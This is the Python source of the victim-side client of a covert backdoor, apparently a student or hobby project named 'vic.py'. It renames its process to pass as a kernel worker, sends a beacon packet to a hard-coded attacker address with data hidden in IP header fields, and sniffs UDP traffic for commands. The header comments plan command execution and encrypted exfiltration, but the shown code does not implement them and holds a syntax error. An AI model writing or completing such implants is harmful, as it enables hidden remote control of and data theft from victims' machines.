#!/usr/bin/env python
# ###################################################################
# vic.py 
# 
# main functions:
#	- 0. when this program is run, change the process name
#	- 1. send initial packet that backdoor client program is run to server
#	- 2. wait for command from backdoor server (sniffing)
#	- 3. extract the command data
#	- 4. excute the command data
#	- 5. get the result from command line
#	- 6. encrypt the data to send
#	- 7. send encrypted data to backdoor server
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import string
from setproctitle import getproctitle, setproctitle


WAITING = 1
KEY = "runningman"	# used for decryption
serv_addr = "192.168.1.9"	# hacker waits for client to run the program

def change_proc():
	try:
		from setproctitle import getproctitle, setproctitle
	except ImportError:
		logging.warning(
		    ("Unable to set import 'setproctitle', "
		     "process name cannot be changed"))
	else:
		setproctitle("%s" % "[kworker/2:3><><><><><><]")



def recv_packet(pkt):
	#print str(unichr(pkt[IP].tos))
	print pkt.show()

def main():
	global WAITING
	# 0. when this program is run, change the process name
	change_proc()
	
	# 1. send initial packet that backdoor client program is run to server
	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
	
	2. wait for command from backdoor server (sniffing)
	while True:
		if WAITING == 1:
			print "waiting 1"
			sniff(filter="udp and dst port 80 and src port 123", prn=recv_packet, count=1)
			print "waiting 2"
			WAITING = 0
			continue
		else: 		# WAITING = 0
			WAITING = 1
			continue

	


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")